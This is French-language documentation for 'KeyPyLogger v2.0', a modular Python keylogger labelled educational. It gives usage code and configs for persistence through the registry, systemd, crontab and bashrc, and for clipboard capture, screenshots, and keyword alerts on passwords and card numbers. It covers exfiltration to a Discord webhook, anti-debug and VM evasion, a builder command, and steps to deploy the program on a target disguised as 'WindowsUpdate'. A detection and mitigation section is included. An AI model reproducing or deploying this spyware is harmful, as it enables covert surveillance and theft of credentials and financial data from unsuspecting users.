# 🚀 KeyPyLogger v2.0 - Advanced Features Documentation

## 📋 Table des Matières

1. [Vue d'ensemble](#vue-densemble)
2. [Persistance](#1-persistance)
3. [Surveillance du Presse-papiers](#2-surveillance-du-presse-papiers)
4. [Capture d'écran Périodique](#3-capture-décran-périodique)
5. [Alertes par Mots-clés](#4-alertes-par-mots-clés)
6. [Watchdog et Monitoring](#5-watchdog-et-monitoring)
7. [Auto-protection](#6-auto-protection)
8. [Guide d'utilisation](#guide-dutilisation)
9. [Détection et Contre-mesures](#détection-et-contre-mesures)

---

## Vue d'ensemble

KeyPyLogger v2.0 introduit des fonctionnalités avancées modulaires qui démontrent les techniques sophistiquées utilisées par les malwares modernes. Chaque fonctionnalité peut être activée/désactivée indépendamment lors de la compilation.

### Architecture Modulaire

```
KeyPyLogger/
├── keylogger_advanced.py       # Core avancé
├── builder_advanced.py         # Builder v2.0
└── modules/
    ├── persistence.py          # Persistance système
    ├── clipboard.py            # Monitoring presse-papiers
    ├── screenshot.py           # Capture d'écran
    ├── keyword_alerts.py       # Système d'alertes
    ├── watchdog.py            # Auto-restart
    └── protection.py          # Self-protection
```

---

## 1. Persistance

### 🎯 Objectif Éducatif
Comprendre comment les malwares s'installent de manière permanente sur un système pour survivre aux redémarrages.

### 🔧 Fonctionnement

#### Windows
1. **Startup Folder** (Priorité 1)
   - Copie l'exécutable dans `%APPDATA%\SystemData\`
   - Crée un raccourci dans le dossier de démarrage
   - Marque le dossier comme caché

2. **Registry Run Key** (Priorité 2)
   ```
   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
   ```

3. **Scheduled Task** (Priorité 3)
   - Tâche planifiée au login utilisateur
   - Se relance automatiquement

#### Linux
1. **Systemd User Service** (Priorité 1)
   ```ini
   [Unit]
   Description=SystemUpdate Service

   [Service]
   ExecStart=/home/user/.config/.system/SystemUpdate
   Restart=always

   [Install]
   WantedBy=default.target
   ```

2. **Crontab @reboot** (Priorité 2)
   ```bash
   @reboot /home/user/.local/.system/SystemUpdate &
   ```

3. **Desktop Autostart** (Priorité 3)
   - Fichier `.desktop` dans `~/.config/autostart/`

4. **Shell RC Files** (Priorité 4)
   - Ajout dans `~/.bashrc`

### 📊 Exemple d'Utilisation

```python
from modules.persistence import PersistenceManager

# Créer le gestionnaire
pm = PersistenceManager(
    program_name="SystemUpdate",
    hide_location=True
)

# Installer la persistance
success, method, path = pm.install()
print(f"Persistance: {method} -> {path}")

# Vérifier l'installation
is_installed, locations = pm.check_installed()
print(f"Installé dans: {locations}")
```

### 🛡️ Détection

**Signes de présence:**
- Entrées dans le dossier de démarrage
- Clés de registre suspectes
- Services systemd non reconnus
- Entrées crontab inattendues

**Outils de détection:**
```bash
# Windows
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Linux
systemctl --user list-units
crontab -l
ls ~/.config/autostart/
```

---

## 2. Surveillance du Presse-papiers

### 🎯 Objectif Éducatif
Démontrer comment les données sensibles peuvent être exfiltrées via le presse-papiers (mots de passe, numéros de carte, etc.).

### 🔧 Fonctionnement

Le module surveille le presse-papiers toutes les 2 secondes et détecte les changements.

```python
from modules.clipboard import ClipboardMonitor

def on_clipboard_change(timestamp, content):
    print(f"[{timestamp}] Clipboard: {content}")

monitor = ClipboardMonitor(
    callback=on_clipboard_change,
    check_interval=2
)

monitor.start()
```

### 📊 Données Capturées

- Mots de passe copiés depuis gestionnaires de mots de passe
- Numéros de carte bancaire
- URLs et emails
- Code source sensible
- Commandes terminal

### 🎨 Format Discord

```markdown
📋 Clipboard Log - DESKTOP-ABC123

[14:30:15]
password123

[14:30:45]
4532 1234 5678 9012

[14:31:00]
ssh user@production-server.com
```

### 🛡️ Protection

**Pour l'utilisateur:**
- Utiliser des gestionnaires de mots de passe avec auto-type
- Éviter de copier des données sensibles
- Vider régulièrement le presse-papiers

**Détection:**
- Monitor les accès API du presse-papiers
- Outils comme Sysinternals Process Monitor (Windows)

---

## 3. Capture d'écran Périodique

### 🎯 Objectif Éducatif
Comprendre la surveillance visuelle et la corrélation avec les frappes clavier.

### 🔧 Fonctionnement

Capture des screenshots à intervalles réguliers, les compresse et les envoie.

```python
from modules.screenshot import ScreenshotCapture

def on_screenshot(timestamp, image_data, size):
    print(f"Screenshot: {size}, {len(image_data)} bytes")

capture = ScreenshotCapture(
    callback=on_screenshot,
    interval=300,        # 5 minutes
    quality=50,          # Compression JPEG
    max_size=(800, 600)  # Redimensionnement
)

capture.start()
```

### 📊 Optimisations

1. **Compression JPEG** - Réduit la taille des fichiers
2. **Redimensionnement** - Limite à 800x600 par défaut
3. **Qualité réglable** - Balance entre qualité et taille

### 💾 Taille des Données

| Résolution | Qualité | Taille approx. |
|------------|---------|----------------|
| 1920x1080  | 100%    | 500-800 KB     |
| 800x600    | 50%     | 30-60 KB       |
| 800x600    | 30%     | 15-30 KB       |

### 🎨 Format Discord

```markdown
📸 Screenshot Captured - DESKTOP-ABC123

Timestamp: 2025-11-15 14:30:45
Size: 800x600
File Size: 45.2 KB

Screenshot data captured (use file upload for full image)
```

### 🛡️ Détection et Protection

**Signes:**
- Augmentation du trafic réseau périodique
- Processus Python accédant à l'API d'affichage

**Protection:**
- Utiliser un filtre de confidentialité physique
- Désactiver l'accès à l'API de capture d'écran
- Surveiller les processus avec accès graphique

---

## 4. Alertes par Mots-clés

### 🎯 Objectif Éducatif
Démontrer la surveillance ciblée et la détection de patterns sensibles.

### 🔧 Fonctionnement

Le système analyse en temps réel les frappes clavier et déclenche des alertes pour les mots-clés configurés.

```python
from modules.keyword_alerts import KeywordAlertSystem, PresetKeywordLists

def on_keyword(keyword, matched, context, timestamp):
    print(f"ALERT! Keyword '{keyword}' detected: {matched}")
    print(f"Context: {context}")

# Utiliser des listes prédéfinies
keywords = PresetKeywordLists.get_credentials()

alerts = KeywordAlertSystem(
    keywords=keywords,
    alert_callback=on_keyword,
    case_sensitive=False
)

# Analyser du texte
alerts.process_text("Mon password est: secret123")
```

### 📚 Listes Prédéfinies

#### 1. **Credentials** (Identifiants)
- password, passwd, pwd
- username, user, login
- email, secret, token
- api, key, credential

#### 2. **Financial** (Financier)
- credit card, debit card
- card number, cvv, cvc
- bank account, routing number
- bitcoin, crypto, wallet

#### 3. **Personal Info** (Infos Personnelles)
- ssn, social security
- date of birth, address
- passport, driver license
- phone number

#### 4. **Corporate** (Entreprise)
- confidential, classified
- internal only, proprietary
- trade secret, nda
- contract, merger

#### 5. **Technical** (Technique)
- database, sql, admin
- server, root, localhost
- connection string, backup

### 🎨 Format Discord Alert

```markdown
🚨 KEYWORD ALERT - DESKTOP-ABC123

Keyword: `password`
Matched: `password`
Timestamp: 2025-11-15 14:30:45

Context:
```
...my password is: secret123 and my u...
```
```

### 📊 Statistiques

```python
# Obtenir les stats
stats = alerts.get_statistics()

# Résultat:
{
    'total_keywords': 25,
    'triggered_keywords': 5,
    'total_detections': 12,
    'detections_by_keyword': {
        'password': 8,
        'email': 3,
        'username': 1
    }
}
```

### 🛡️ Détection

**Contre-mesures:**
- Utiliser des gestionnaires de mots de passe avec auto-fill
- Éviter de taper des données sensibles en texte clair
- Utiliser des applications avec protection contre le keylogging

---

## 5. Watchdog et Monitoring

### 🎯 Objectif Éducatif
Comprendre les mécanismes de résilience et d'auto-guérison des malwares.

### 🔧 Composants

#### A. Watchdog (Auto-restart)

Redémarre automatiquement le processus s'il crash.

```python
from modules.watchdog import WatchdogManager

watchdog = WatchdogManager(
    target_script="/path/to/keylogger.py",
    check_interval=30,
    max_restarts=10
)

watchdog.start_watchdog()
```

#### B. Process Monitor

Surveille l'état du processus et détecte les duplicatas.

```python
from modules.watchdog import ProcessMonitor

monitor = ProcessMonitor(process_name="keylogger.py")

# Vérifier si le processus tourne
running, pid = monitor.is_process_running()

# S'assurer d'une instance unique
is_unique, existing_pid = monitor.ensure_single_instance()

if not is_unique:
    print(f"Another instance running: PID {existing_pid}")
```

#### C. Health Checker

Envoie des rapports de santé périodiques.

```python
from modules.watchdog import HealthChecker

def on_health_check(health_info):
    print(f"CPU: {health_info['cpu_percent']}%")
    print(f"Memory: {health_info['memory_mb']} MB")
    print(f"Uptime: {health_info['uptime_seconds']}s")

health = HealthChecker(
    callback=on_health_check,
    check_interval=300
)

health.start()
```

### 📊 Informations de Santé

```json
{
    "pid": 12345,
    "name": "python",
    "status": "running",
    "cpu_percent": 0.5,
    "memory_mb": 45.2,
    "num_threads": 5,
    "uptime_seconds": 3600,
    "num_fds": 15
}
```

### 🎨 Format Discord

```markdown
💓 Health Check - DESKTOP-ABC123

PID: 12345
Status: running
CPU Percent: 0.5%
Memory MB: 45.2
Num Threads: 5
Uptime Seconds: 3600

Health Monitor
```

---

## 6. Auto-protection

### 🎯 Objectif Éducatif
Démontrer les techniques anti-forensics et d'évasion utilisées par les malwares avancés.

### 🔧 Mécanismes

#### A. Désactivation des Signaux

```python
from modules.protection import SelfProtection

protection = SelfProtection(
    on_tamper_callback=lambda type, details: print(f"Tamper: {type}")
)

# Désactiver Ctrl+C
protection.disable_ctrl_c()

# Désactiver SIGTERM
protection.disable_sigterm()
```

#### B. Masquage de Fenêtre (Windows)

```python
# Cache la fenêtre console
protection.hide_window()
```

#### C. Monitoring d'Intégrité

Détecte si le fichier est modifié ou supprimé.

```python
# Surveiller le fichier actuel
protection.start_integrity_monitor(check_interval=60)

# Ajouter des fichiers à surveiller
protection.add_watched_file("/path/to/config.ini")
```

#### D. Mutex (Instance Unique)

```python
# Créer un mutex pour empêcher les duplicatas
success = protection.create_mutex("KeyPyLogger_Unique_Mutex")

if not success:
    print("Another instance is running!")
    sys.exit(1)
```

#### E. Détection d'Environnement

```python
# Détecter un débogueur
if protection.is_debugger_present():
    print("Debugger detected!")
    # Action: exit, send alert, etc.

# Détecter une VM
if protection.detect_vm():
    print("Running in virtual machine!")
    # Action: change behavior, exit, etc.
```

### 📋 Indicateurs de VM

Le système détecte:
- VMware (vmx, vmware)
- VirtualBox (vbox, virtualbox)
- QEMU/KVM
- Hyper-V
- Parallels
- Xen

**Méthodes de détection:**
1. Informations système (manufacturer, model)
2. Fichiers DMI Linux (`/sys/class/dmi/id/`)
3. Adresses MAC des VM connues
4. Artefacts spécifiques aux hyperviseurs

### 🎨 Alertes Discord

```markdown
🔔 TAMPER_DETECTED

FILE_MODIFIED: Monitored file modified: /path/to/keylogger.py

System: DESKTOP-ABC123
Timestamp: 2025-11-15 14:30:45
```

```markdown
🔔 DEBUGGER_DETECTED

Debugger is attached

System: DESKTOP-ABC123
Timestamp: 2025-11-15 14:30:45
```

### 🛡️ Contre-mesures pour Analystes

**Pour détecter:**
- Process Monitor (Windows) pour voir les appels API
- strace/ltrace (Linux) pour tracer les appels système
- Utiliser un débogueur furtif (ScyllaHide, etc.)
- Analyser dans un environnement bare-metal

**Pour contourner:**
- Patcher les vérifications de VM
- Utiliser des VMs avec profil matériel personnalisé
- Masquer les artefacts de débogage

---

## Guide d'Utilisation

### Installation

```bash
# Cloner le repository
git clone https://github.com/votre-repo/KeyPyLogger.git
cd KeyPyLogger

# Installer les dépendances
pip install -r requirements.txt
```

### Configuration avec Builder Advanced

```bash
# Mode interactif (recommandé)
python builder_advanced.py

# Mode ligne de commande (toutes fonctionnalités activées)
python builder_advanced.py "https://discord.com/api/webhooks/YOUR_WEBHOOK" 60
```

### Options de Configuration

Le builder vous guide à travers:

1. **Configuration de base**
   - Webhook Discord
   - Intervalle d'envoi

2. **Fonctionnalités avancées**
   - ✅ Persistance
   - ✅ Clipboard monitoring
   - ✅ Screenshots (avec intervalle)
   - ✅ Keyword alerts (sélection de listes)
   - ✅ Self-protection
   - ✅ Health monitoring

3. **Personnalisation**
   - Nom du programme
   - Nom du fichier de sortie

### Exécution

```bash
# Copier le dossier build sur la machine cible
cp -r build/ /target/location/

# Sur la machine cible
cd /target/location/build/
pip install -r ../requirements.txt
python keylogger_configured.py
```

### Exemple de Configuration Complète

```
Webhook: https://discord.com/api/webhooks/123.../abc...
Send Interval: 60 seconds
Persistence: ✓
Clipboard: ✓
Screenshots: ✓ (every 300s)
Keyword Alerts: ✓ (credentials, financial)
Self-Protection: ✓
Health Monitoring: ✓
Program Name: WindowsUpdate
```

---

## Détection et Contre-mesures

### 🔍 Pour les Défenseurs

#### 1. Détection Réseau

```bash
# Monitorer les connexions sortantes
netstat -an | grep ESTABLISHED
ss -tupn | grep python

# Capturer le trafic Discord
tcpdump -i any -w capture.pcap 'host discord.com'
```

#### 2. Détection Processus

```bash
# Windows
tasklist | findstr python
wmic process where name="python.exe" get commandline

# Linux
ps aux | grep python
lsof -i -P | grep python
```

#### 3. Détection Persistance

```bash
# Windows
autoruns.exe  # Sysinternals
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Linux
systemctl --user list-units --all
crontab -l
ls ~/.config/autostart/
```

#### 4. Détection Comportement

**Signes suspects:**
- Processus Python avec nom générique
- Trafic HTTPS périodique vers Discord
- Accès fréquent au presse-papiers
- Captures d'écran en background
- Haute utilisation du CPU/RAM inexpliquée

#### 5. Outils de Détection

- **Windows:** ProcessMonitor, ProcessHacker, Autoruns
- **Linux:** strace, lsof, netstat, ps
- **Réseau:** Wireshark, tcpdump
- **Antivirus:** Windows Defender, ClamAV, ESET

### 🛡️ Mitigation

1. **Prévention**
   - Ne jamais exécuter de scripts non vérifiés
   - Utiliser un antivirus à jour
   - Activer l'UAC (Windows) et SELinux (Linux)
   - Limiter les permissions utilisateur

2. **Détection**
   - Monitoring réseau (IDS/IPS)
   - EDR (Endpoint Detection and Response)
   - Audit régulier des autorisations

3. **Réponse**
   - Isolation de la machine
   - Kill du processus malveillant
   - Nettoyage de la persistance
   - Réinitialisation des credentials
   - Analyse forensique complète

---

## 📚 Objectifs Pédagogiques

Ce projet permet d'apprendre:

1. **Architecture modulaire** en Python
2. **Persistance multi-plateforme** (Windows/Linux)
3. **Exfiltration de données** (webhooks, compression)
4. **Techniques d'évasion** (VM detection, anti-debug)
5. **Surveillance système** (processus, santé, intégrité)
6. **Pattern matching** et alertes en temps réel
7. **Threading** et programmation asynchrone
8. **Détection et réponse** aux incidents

## ⚠️ Disclaimer Final

**CE PROJET EST STRICTEMENT ÉDUCATIF.**

- ✅ Utilisation autorisée: Labs, VMs, CTFs, devoirs académiques
- ❌ Utilisation interdite: Systèmes non autorisés, surveillance illégale

**Toute utilisation malveillante est de la responsabilité de l'utilisateur.**

---

## 🎓 Pour Votre Rapport

### Points à Inclure

1. **Architecture technique**
   - Diagrammes des modules
   - Flow charts

2. **Analyse de sécurité**
   - Vecteurs d'attaque
   - Méthodes de détection
   - Contre-mesures

3. **Résultats de tests**
   - Captures d'écran Discord
   - Logs de détection
   - Performance impact

4. **Recommandations**
   - Pour défenseurs
   - Pour développeurs sécurisés
   - Pour utilisateurs finaux

Bonne chance avec ton projet ! 🎯
